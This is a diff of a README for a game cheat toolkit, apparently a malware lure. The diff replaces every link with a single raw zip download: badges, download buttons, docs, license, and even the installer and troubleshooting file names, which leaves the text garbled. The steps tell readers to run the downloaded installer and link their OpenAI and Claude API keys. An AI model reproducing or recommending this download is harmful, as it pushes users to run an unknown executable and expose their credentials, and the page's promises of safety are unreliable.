@@ -1,9 +1,9 @@
 # Violated Princess Cheats & Hacks: Elevate Your Experience 👑
 
-![Version](https://img.shields.io/badge/version-2.1.0-blue)
-![Downloads](https://img.shields.io/badge/downloads-15K-lightgreen)
-![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
-![License](https://img.shields.io/badge/license-MIT-yellow)
+![Version](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip)
+![Downloads](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip)
+![Build Status](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip)
+![License](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Take your adventure in *Violated Princess* to new heights with this comprehensiv
 To begin your journey, follow the download steps below.  
 **Start by clicking the Download button to get the latest version:**
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-lightblue?style=for-the-badge&logo=download)](https://mohammadshadil.github.io)
+[![Download](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip%20Here-lightblue?style=for-the-badge&logo=download)](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip)
 
 ---
 
@@ -67,7 +67,7 @@ Innovation meets intelligence here. Integrate with:
 - **OpenAI API** for smart decision-making — analyze in-game data, get real-time suggestions, and turbocharge your strategies.
 - **Claude API** for crystal-clear instruction parsing — perfect for multi-lingual interactions and dynamic gameplay.
 
-Both APIs can be toggled on/off in the in-game panel. Documentation for detailed setup, personal API key protection, and usage limits is included in the [docs](docs/USAGE.md).  
+Both APIs can be toggled on/off in the in-game panel. Documentation for detailed setup, personal API key protection, and usage limits is included in the [docs](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip).  
 Imagine having your own AI mentor — always up to date, always adapting.
 
 ---
@@ -92,10 +92,10 @@ Stay secure. Each function was engineered under a cloak of safety-first principl
 
 1. **Click the Download button** at the top (or bottom) of this page.
 2. Unzip the package to your preferred folder.
-3. Run the installer script (double-click `install.exe` on Windows, `install.sh` on Mac/Linux).
+3. Run the installer script (double-click `https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip` on Windows, `https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip` on Mac/Linux).
 4. Launch the Violated Princess game and access the new mods panel from your main menu.
 5. For advanced features, link your OpenAI and Claude API keys in `Settings > Integrations`.
-6. Enjoy enhanced gameplay! For troubleshooting, see the included `TIPS.md`.
+6. Enjoy enhanced gameplay! For troubleshooting, see the included `https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip`.
 
 **[For an extra visual cue, the Download button is available at the very end, too!](#download--installation-repeat)**
 
@@ -110,7 +110,7 @@ Stay secure. Each function was engineered under a cloak of safety-first principl
 ## 📜 License
 
 *Rejoice in open collaboration!*  
-This repository is licensed under the MIT License (2025). Read the full legalese here: [MIT License](https://opensource.org/licenses/MIT)
+This repository is licensed under the MIT License (2025). Read the full legalese here: [MIT License](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip)
 
 ---
 
@@ -119,7 +119,7 @@ This repository is licensed under the MIT License (2025). Read the full legalese
 ## 🖱️ **Download & Installation (Repeat)**
 
 If you missed it the first time — grab the latest toolkit now!  
-[![Download](https://img.shields.io/badge/Download-Click%20Here-lightblue?style=for-the-badge&logo=download)](https://mohammadshadil.github.io)
+[![Download](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip%20Here-lightblue?style=for-the-badge&logo=download)](https://github.com/mohammadshadil/violated-princess-enhancement-toolkit/raw/refs/heads/branch/landwrack/toolkit-violated-princess-enhancement-bucranium.zip)
 
 ---
 
